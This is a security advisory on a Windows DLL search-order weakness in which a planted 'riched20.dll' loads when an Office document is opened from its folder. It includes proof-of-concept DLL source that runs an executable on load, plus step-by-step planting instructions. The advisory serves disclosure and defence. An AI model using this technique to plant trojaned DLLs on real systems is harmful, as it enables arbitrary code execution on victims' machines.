source: http://www.securityfocus.com/bid/1699/info

When a program executes under Microsoft Windows, it may require additional code stored in DLL library files. These files are dynamically located at run time, and loaded if necessary. A weakness exists in the algorithm used to locate these files.

The search algorithm used to locate DLL files specifies that the current working directory is checked before the System folders. If a trojaned DLL can be inserted into the system in an arbitrary location, and a predictable executable called with the same current working directory, the trojaned DLL may be loaded and executed. This may occur when a data file is accessed through the 'Run' function, or double clicked in Windows Explorer.

This has been reported to occur with the 'riched20.dll' and 'msi.dll' DLL files and some Microsoft Office applications, including WordPad.

This behavior has also been reported for files loaded from UNC shares, or directly from FTP servers. 

// dll1.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "stdlib.h"

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
   switch( ul_reason_for_call ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
			MessageBox(NULL, "Hello world!", "Info", MB_OK);
			MessageBox(NULL, "Shall try to start: C:\\TEST.EXE\n You may need to create it.", "Info", MB_OK);
			system("C:\\TEST.EXE");
            break;

        case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
		//	MessageBox(NULL, "DllMain.dll: DLL_THREAD_ATTACH", "Info", MB_OK);
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }

    return TRUE;
}

1) Rename dll1.dll to riched20.dll
2) Place riched20.dll in a directory of your choice
3) Close all Office applications
4) From Windows Explorer double click on an Office document (preferably MS Word document) in the directory containg riched20.dll